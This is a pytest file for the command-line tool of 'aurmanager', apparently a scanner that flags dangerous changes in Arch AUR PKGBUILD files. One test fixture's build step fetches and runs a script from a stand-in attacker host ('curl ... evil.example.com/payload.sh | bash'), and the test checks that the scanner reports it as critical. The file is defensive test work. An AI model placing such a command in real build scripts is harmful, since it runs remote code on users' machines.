from __future__ import annotations

from aurmanager.cli import _select_rules, main
from aurmanager.rules import ALL_RULES


def _write_pkgbuild(tmp_path, name, body):
    d = tmp_path / name
    d.mkdir()
    (d / "PKGBUILD").write_text(body)
    return d


def test_select_rules_default_is_all_rules():
    assert _select_rules(None, None) == list(ALL_RULES)


def test_select_rules_selects_known_id():
    assert [r.rule_id for r in _select_rules("RCE001", None)] == ["RCE001"]


def test_select_rules_rejects_unknown_id():
    assert _select_rules("BOGUS999", None) is None


def test_select_rules_rejects_empty_after_stripping():
    # Regression: "," (or any all-comma/whitespace value) used to strip down to
    # an empty id list, pass the vacuous `all(...)` check, and silently select
    # zero rules instead of erroring -- a full scanner bypass via the CLI.
    assert _select_rules(",", None) is None
    assert _select_rules(" , ,", None) is None


def test_select_rules_rejects_explicit_empty_string():
    # Regression: an explicit --rules "" is distinct from omitting --rules
    # entirely (None) -- it used to be treated the same as omitted and silently
    # default to ALL_RULES instead of being rejected as invalid input.
    assert _select_rules("", None) is None


def test_diff_command_fails_on_new_critical_finding(tmp_path, capsys):
    old = _write_pkgbuild(
        tmp_path,
        "old",
        """
        pkgname=foo
        pkgver=1.0
        source=("https://example.com/$pkgname-$pkgver.tar.gz")
        sha256sums=('deadbeef')
        build() {
          make
        }
        """,
    )
    new = _write_pkgbuild(
        tmp_path,
        "new",
        """
        pkgname=foo
        pkgver=1.1
        source=("https://example.com/$pkgname-$pkgver.tar.gz")
        sha256sums=('cafebabe')
        build() {
          curl -fsSL https://evil.example.com/payload.sh | bash
          make
        }
        """,
    )
    exit_code = main(["diff", str(old), str(new), "--no-color"])
    assert exit_code == 1
    out = capsys.readouterr().out
    assert "RCE001" in out
    assert "Diff verdict: CRITICAL" in out


def test_diff_command_clean_on_ordinary_version_bump(tmp_path, capsys):
    old = _write_pkgbuild(
        tmp_path,
        "old",
        """
        pkgname=foo
        pkgver=1.0
        source=("https://example.com/$pkgname-$pkgver.tar.gz")
        sha256sums=('deadbeef')
        build() {
          make
        }
        """,
    )
    new = _write_pkgbuild(
        tmp_path,
        "new",
        """
        pkgname=foo
        pkgver=1.1
        source=("https://example.com/$pkgname-$pkgver.tar.gz")
        sha256sums=('cafebabe')
        build() {
          make
        }
        """,
    )
    exit_code = main(["diff", str(old), str(new), "--no-color"])
    assert exit_code == 0
    out = capsys.readouterr().out
    assert "Diff verdict: INFO" in out


def test_diff_command_rejects_bad_rules_selection(tmp_path):
    old = _write_pkgbuild(tmp_path, "old", "pkgname=foo\npkgver=1.0\n")
    new = _write_pkgbuild(tmp_path, "new", "pkgname=foo\npkgver=1.1\n")
    exit_code = main(["diff", str(old), str(new), "--rules", ","])
    assert exit_code == 2
